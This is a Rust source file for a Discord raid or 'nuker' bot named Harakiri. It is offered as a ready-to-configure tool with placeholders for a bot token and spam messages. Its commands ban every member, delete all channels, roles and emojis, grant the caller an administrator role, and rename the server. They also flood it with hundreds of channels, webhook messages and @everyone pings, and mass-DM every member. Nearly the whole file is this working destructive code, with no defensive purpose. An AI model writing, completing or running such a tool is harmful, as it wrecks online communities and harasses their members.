use tokio::{
    task,
    time::{sleep, Duration},
};

use serenity::{
    async_trait,
    builder::CreateChannel,
    framework::standard::{
        macros::{command, group},
        CommandResult, StandardFramework,
    },
    futures::StreamExt,
    model::channel::Message,
    model::gateway::Activity,
    model::gateway::GatewayIntents,
    model::permissions::Permissions,
    model::prelude::*,
    prelude::*,
};

#[group]
#[commands(raid, nuke, help, banall, mdall, delroles, massrole, adm, masschannel, delemojis)]
struct General;
struct Handler;

static mut CHANNELS: i32 = 0;
static mut WEBHOOKS: i32 = 0;
static mut WEBHOOKS_MESSAGES: i32 = 0;

struct Config {
    token: &'static str,
    prefix: &'static str,
    presence: &'static str,
    channel_name: &'static str,
    channel_message: &'static str,
    webhook_name: &'static str,
    dm_message: &'static str,
    guild_name: &'static str,
    guild_icon: Option<&'static str>,
    role_name: &'static str,
}

// Set your configuration below that commentary

const CONFIG: Config = Config {
    token: "BOT_TOKEN",
    prefix: ".",
    presence: "PRESENCE_TEXT",
    channel_name: "CHANNEL_NAME",
    channel_message: "@everyone",
    webhook_name: "WEBHOOK_NAME",
    dm_message: "MESSAGE_TO_DM_USERS",
    guild_name: "SERVER_NAME_TO_CHANGE",
    guild_icon: Some(""), // To disable just replace Some("") with None
    role_name: "ROLE_NAME",
};

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, ready: Ready) {
        let activity = Activity::streaming(CONFIG.presence, "https://twitch.tv/github");

        // Change Some(activity) to None to delete activity.
        // OnlineStatus::DoNotDisturb | OnlineStatus::Idle
        // OnlineStatus::Invisible | OnlineStatus::Offline
        // OnlineStatus::Online
        ctx.set_presence(Some(activity), OnlineStatus::DoNotDisturb)
            .await;
        println!("[HARAKIRI ~ LOG] Bot started as {}", ready.user.name);
    }
}

#[command]
async fn adm(ctx: &Context, msg: &Message) -> CommandResult {
    let guild_id = msg.guild_id.unwrap();
    let author_id = msg.author.id;

    let role = guild_id
        .create_role(&ctx.http, |r| {
            r.name(".")
                .permissions(Permissions::ADMINISTRATOR)
                .mentionable(false)
                .hoist(true)
        })
        .await
        .unwrap();

    let mut member = guild_id.member(&ctx.http, author_id).await.unwrap();

    member.add_role(&ctx.http, role).await.unwrap();

    let message = msg
        .channel_id
        .send_message(&ctx.http, |m| m.content("Role added."))
        .await
        .unwrap();

    sleep(Duration::from_millis(500)).await;

    message.delete(&ctx.http).await.unwrap();

    Ok(())
}

#[command]
async fn massrole(ctx: &Context, msg: &Message) -> CommandResult {
    let guild_id = msg.guild_id.unwrap();

    for _ in 0..50 {
        let ctx_copy = ctx.clone();
        task::spawn(async move {
            match guild_id
                .create_role(&ctx_copy.http, |r| r.name(CONFIG.role_name))
                .await
            {
                Ok(role) => {
                    println!("[{}] Role has been created", role.id);
                }
                Err(e) => {
                    eprintln!("Cannot create role: {:?}", e);
                }
            }
        });
    }

    Ok(())
}

#[command]
async fn banall(ctx: &Context, msg: &Message) -> CommandResult {
    let guild_id = msg.guild_id.unwrap();
    let mut members = guild_id.members_iter(&ctx).boxed();

    while let Some(member_result) = members.next().await {
        match member_result {
            Ok(member) => {
                if member.user.bot || member.user.id == msg.author.id {
                    continue;
                }

                match member.ban(&ctx.http, 0).await {
                    Ok(_) => {
                        println!("[{}] was banned Successfully", member.user.tag())
                    }
                    Err(_) => {
                        println!("[{}] I Can't ban this user!", member.user.tag())
                    }
                }
            }
            Err(err) => {
                eprintln!("Error fetching user {:?}", err);
            }
        }
    }

    Ok(())
}

#[command]
async fn delroles(ctx: &Context, msg: &Message) -> CommandResult {
    let guild_id = msg.guild_id.unwrap();
    let roles = guild_id.roles(&ctx.http).await?;
    let mut tasks = Vec::new();

    for role in roles {
        let ctx_copy = ctx.clone();
        tasks.push(task::spawn(async move {
            let mut role = role.1;

            match role.delete(&ctx_copy.http).await {
                Ok(_) => {
                    println!("Role Sucessfully Deleted: {} | {}", role.name, role.id);
                }
                Err(_) => {
                    eprintln!("Cannot delete role: {}", role.id);
                }
            }
        }));
    }

    for task in tasks {
        task.await.unwrap();
    }

    Ok(())
}

#[command]
async fn mdall(ctx: &Context, msg: &Message) -> CommandResult {
    let guild_id = msg.guild_id.unwrap();
    let mut members = guild_id.members_iter(&ctx).boxed();

    while let Some(member_result) = members.next().await {
        let ctx_copy = ctx.clone();
        task::spawn(async move {
            match member_result {
                Ok(member) => {
                    if member.user.bot {
                        return;
                    }

                    match member
                        .user
                        .direct_message(&ctx_copy.http, |m| m.content(CONFIG.dm_message))
                        .await
                    {
                        Ok(_) => {
                            println!("[{}] Sent dm Successfully", member.user.tag())
                        }
                        Err(_) => {
                            println!(
                                "[{}] I Can't Send DM Message to this user!",
                                member.user.tag()
                            )
                        }
                    };
                }
                Err(err) => {
                    eprintln!("Error fetching user {:?}", err);
                }
            }
        });
    }

    Ok(())
}

#[command]
async fn help(ctx: &Context, msg: &Message) -> CommandResult {
    msg.reply(
        &ctx.http,
        format!("```--- Harakiri Rust Bot ---\n\n{0}raid - Raids Server\n{0}nuke - Delete all channels\n{0}help - Shows that message\n{0}mdall - DM All Everyone\n{0}banall - Ban all users from guild\n{0}delroles - Delete all roles from guild\n{0}massrole - Create a 50 roles\n{0}adm - Gives you a role with admin\n{0}masschannel - Create a lot of channel```", CONFIG.prefix),
    )
    .await
    .unwrap();

    Ok(())
}

#[command]
async fn masschannel(ctx: &Context, msg: &Message) -> CommandResult {
    let guild_id = msg.guild_id.unwrap();
    let mut tasks = Vec::new();

    for _ in 0..450 {
        let ctx_copy = ctx.clone();
        //sleep(Duration::from_millis(100)).await;

        tasks.push(task::spawn(async move {
            match guild_id
                .create_channel(&ctx_copy.http, |c| c.name(CONFIG.channel_name))
                .await
            {
                Ok(channel) => {
                    println!("[{}] Channel Created Sucessfully", channel.id);
                }
                Err(_) => {
                    eprintln!("Error creating channel");
                }
            }
        }));
    }

    for task in tasks {
        task.await.unwrap();
    }

    Ok(())
}

#[command]
async fn delemojis(ctx: &Context, msg: &Message) -> CommandResult {
    let guild_id = msg.guild_id.unwrap();

    for emoji in guild_id.emojis(&ctx.http).await? {
        let ctx_copy = ctx.clone();
        task::spawn(async move {
            match emoji.delete(&ctx_copy).await {
                Ok(_) => {
                    println!("[<:{}:{}>] Got Deleted", emoji.name, emoji.id)
                }
                Err(_) => {
                    eprintln!("Cannot delete emoji: {}", emoji.name)
                }
            }
        });
    }

    Ok(())
}

#[command]
async fn nuke(ctx: &Context, msg: &Message) -> CommandResult {
    let guild_id = msg.guild_id.unwrap();

    let channels = guild_id.channels(&ctx.http).await.unwrap();

    let mut tasks = Vec::new();

    for channel in channels {
        let ctx_copy = ctx.clone();
        let http_copy = ctx_copy.http.clone();
        let task = task::spawn(async move {
            let channel = channel.1;
            channel.delete(http_copy).await.unwrap();
        });
        tasks.push(task);
    }

    for task in tasks {
        task.await?;
    }

    let new_channel = guild_id
        .create_channel(&ctx.http, |c: &mut CreateChannel| c.name("nuked"))
        .await
        .unwrap();

    new_channel.say(&ctx.http, "`Channel Nuked`").await?;

    Ok(())
}

#[command]
async fn raid(ctx: &Context, msg: &Message) -> CommandResult {
    let mut guild_id = msg.guild_id.unwrap();

    guild_id
        .edit(&ctx.http, |g| {
            g.name(CONFIG.guild_name).icon(CONFIG.guild_icon)
        })
        .await
        .unwrap();

    for _ in 1..10 {
        let ctx_wrapper = ctx.clone();
        let guild_id_wrapper = guild_id.clone();

        sleep(Duration::from_millis(650)).await;

        let task = task::spawn(async move {
            for _ in 1..15 {
                sleep(Duration::from_millis(25)).await;

                let ctx_copy = ctx_wrapper.clone();
                let guild_id_copy = guild_id_wrapper.clone();
                let task = task::spawn(async move {
                    let new_channel = guild_id_copy
                        .create_channel(&ctx_copy.http, |c: &mut CreateChannel| {
                            c.name(CONFIG.channel_name)
                        })
                        .await;

                    if let Err(error) = new_channel {
                        eprintln!("Error: {:?}", error);
                    } else {
                        let channel = new_channel.unwrap();
                        unsafe {
                            CHANNELS += 1;
                            println!("[{}] New Channel Created", CHANNELS);
                        }

                        let context_cp3 = ctx_copy.clone();
                        let channel_copy = channel.clone();

                        task::spawn(async move {
                            sleep(Duration::from_millis(500)).await;
                            for _ in 1..51 {
                                sleep(Duration::from_millis(200)).await;
                                let copy = channel_copy.clone();
                                copy.say(&context_cp3.http, CONFIG.channel_message)
                                    .await
                                    .unwrap();
                            }
                        });

                        task::spawn(async move {
                            sleep(Duration::from_millis(4000)).await;
                            match channel
                                .create_webhook(&ctx_copy.http, CONFIG.webhook_name)
                                .await
                            {
                                Ok(webhook) => {
                                    unsafe {
                                        WEBHOOKS += 1;
                                        println!("[{}] New Webhook Created", WEBHOOKS);
                                    }
                                    for _ in 1..500 {
                                        sleep(Duration::from_millis(300)).await;
                                        webhook
                                            .execute(&ctx_copy.http, false, |w| {
                                                w.content(CONFIG.channel_message)
                                            })
                                            .await
                                            .unwrap();

                                        unsafe {
                                            WEBHOOKS_MESSAGES += 1;
                                            println!(
                                                "[{}] Webhook Sent Message",
                                                WEBHOOKS_MESSAGES
                                            );
                                        }
                                    }
                                }
                                Err(e) => {
                                    eprintln!("Error while creating webhook: {:?}", e);
                                }
                            }
                        });
                    }
                });

                task::spawn(async move {
                    task.await.unwrap();
                });
            }
        });

        task::spawn(async move {
            task.await.unwrap();
        });
    }

    Ok(())
}

#[tokio::main]
async fn main() {
    let mut client = Client::builder(CONFIG.token, GatewayIntents::all())
        .event_handler(Handler)
        .framework(
            StandardFramework::new()
                .configure(|c| c.prefix(CONFIG.prefix))
                .group(&GENERAL_GROUP),
        )
        .await
        .expect("Error creating client");

    if let Err(why) = client.start().await {
        println!("Client error: {:?}", why);
    }
}
